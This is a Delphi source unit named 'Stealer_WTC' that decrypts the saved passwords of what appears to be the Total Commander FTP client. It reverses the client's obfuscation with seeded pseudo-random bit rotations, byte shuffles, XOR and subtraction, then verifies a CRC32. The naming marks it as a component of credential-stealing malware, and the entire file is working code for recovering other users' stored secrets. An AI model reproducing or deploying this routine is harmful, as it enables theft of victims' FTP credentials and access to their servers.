unit Stealer_WTC;

interface

uses
  Sysutils, CRC32;

function WTCDecrypt(const Password: AnsiString): AnsiString;

implementation

function DecryptPass(const Password: AnsiString): AnsiString;
var
  Pass: PByteArray;
  L: Integer;
  i, c: Integer;

  k, p: Byte;

  seed: LongWord;

  function rand(Max: LongWord): LongWord;
  begin
    seed := seed * $8088405 + 1;
    Result := (Int64(seed) * Max) shr 32;
  end;

var
  crc32: LongWord;

begin
  Result := '';

  // skip passwords protected with global password
  if (Length(Password) > 0) and (Password[1] = '!') then
    Exit;

  L := (Length(Password) shr 1)-1;

  if (Length(Password) mod 2 <> 0) or (L < 4) then Exit;

  GetMem(Pass, L+1);

  try
    c := 0;
    for i := 0 to L do begin
      Pass[c] := StrToInt('$' + Copy(Password, i*2+1, 2));
      Inc(c);
    end;
  except
    FreeMem(Pass);
    Exit;
  end;

  crc32 := PLongWord(@Pass[L-3])^;

  L := L-4;
  Pass[L+1] := 0;

  seed := $cf671;
  for i := 0 to L do begin
    k := rand(8);
    Pass[i] := (Pass[i] shl k) or (Pass[i] shr (8-k)); // ROL
  end;

  seed := $3039;
  for i := 0 to 255 do begin
    k := rand(L+1);
    p := rand(L+1);
    c := Pass[k];
    Pass[k] := Pass[p];
    Pass[p] := c;
  end;

  seed := $a564;
  for i := 0 to L do
    Pass[i] := Pass[i] xor rand($100);

  seed := $d431;
  for i := 0 to L do
    Pass[i] := Pass[i] + $100 - rand($100);

  if CRC32BUpdate(LongWord(-1), @Pass[0], L+1) = crc32 then
    Result := StrPas(pansichar(@Pass[0]));

  FreeMem(Pass);
end;

function WTCDecrypt(const Password: AnsiString): AnsiString;
begin
  Result := '';
  result:=DecryptPass(Password);
end;

end.
